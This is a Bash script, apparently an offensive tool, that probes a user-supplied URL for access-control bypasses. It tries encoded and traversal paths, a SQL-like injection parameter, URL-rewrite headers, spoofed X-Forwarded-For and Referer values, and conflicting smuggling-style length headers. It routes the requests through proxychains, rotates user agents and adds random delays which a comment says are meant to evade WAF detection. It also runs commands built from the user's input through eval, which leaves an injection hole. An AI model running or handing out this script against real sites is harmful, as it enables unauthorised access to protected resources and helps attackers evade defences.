#!/bin/bash

# Define color codes
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[0;33m'
RED='\033[0;31m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Ask for the target URL
read -p "Enter the target URL you want to bypass (e.g., https://www.google.com): " target_url

# List of random user agents
user_agents=("Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18"
             "Safari/537.36 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)"
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
             "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
             "Edge/91.0.864.54"
             "curl/7.64.1")

# Array of different bypass techniques based on the user-provided URL
bypasses=(
    "$target_url"
    "${target_url//\//%2F}"                        # URL encoding slashes
    "${target_url//\//%252F}"                      # Double encoding slashes
    "${target_url}?download=1"                     # Adding download action
    "${target_url}?action=view"                    # Adding action parameter
    "${target_url}?id=1&debug=true"                # Debug mode
    "${target_url}?debug=1%20AND%201=1"            # SQL-like injection
    "$target_url#%23"                              # Adding a fragment identifier
    "${target_url}?.jpg"                           # Extension manipulation
    "${target_url}/../"                            # Directory traversal
)

# Custom header variations (bypass with different headers)
headers=(
    "-H \"Range: bytes=0-1024\""                       # Range request
    "-H \"Content-Length: 9999\" -H \"Transfer-Encoding: chunked\"" # HTTP smuggling
    "-H \"X-Original-URL: $target_url\""               # X-Original-URL header
    "-H \"X-Rewrite-URL: $target_url\""                # X-Rewrite-URL header
    "-H \"Referer: https://www.google.com\" -H \"X-Forwarded-For: 127.0.0.1\""  # Spoofing IP and Referer
    "-H \"Origin: https://www.google.com\""            # Origin header manipulation
    "-H \"Cache-Control: no-cache\" -H \"Pragma: no-cache\""  # Cache busting
    "-H \"Accept-Encoding: gzip, deflate\""            # Accept-Encoding header manipulation
)

# Function to generate a random delay between 5 to 10 seconds
generate_random_delay() {
    echo $(awk -v min=5 -v max=10 'BEGIN{srand(); print int(min+rand()*(max-min+1))}')
}

# Loop through each bypass technique and random user-agent
for bypass in "${bypasses[@]}"
do
    for header in "${headers[@]}"
    do
        # Randomly select a user-agent
        random_agent="${user_agents[$RANDOM % ${#user_agents[@]}]}"

        # Random delay generation
        random_delay=$(generate_random_delay)

        # Build the curl command to be printed and executed
        curl_command="proxychains curl -X GET \"$bypass\" -H \"User-Agent: $random_agent\" $header"

        # Print the curl command that will be executed
        echo -e "${CYAN}Curl Command:${NC} ${YELLOW}$curl_command${NC}"

        # Execute the request with curl via proxychains, printing status code and response size
        response=$(eval "$curl_command -s -o /dev/null -w \"%{http_code} %{size_download}\"")

        # Print status code and response size with color coding
        status_code=$(echo $response | awk '{print $1}')
        response_size=$(echo $response | awk '{print $2}')

        if [[ $status_code == 2* ]]; then
            echo -e "${GREEN}Status Code: $status_code${NC}, Response Size: ${GREEN}$response_size bytes${NC}"
        elif [[ $status_code == 4* ]]; then
            echo -e "${RED}Status Code: $status_code${NC}, Response Size: ${YELLOW}$response_size bytes${NC}"
        else
            echo -e "${RED}Status Code: $status_code${NC}, Response Size: ${RED}$response_size bytes${NC}"
        fi

        # Random delay to avoid WAF detection
        echo -e "${CYAN}Sleeping for ${YELLOW}$random_delay${CYAN} seconds before next request...${NC}"
        sleep "$random_delay"
    done
done

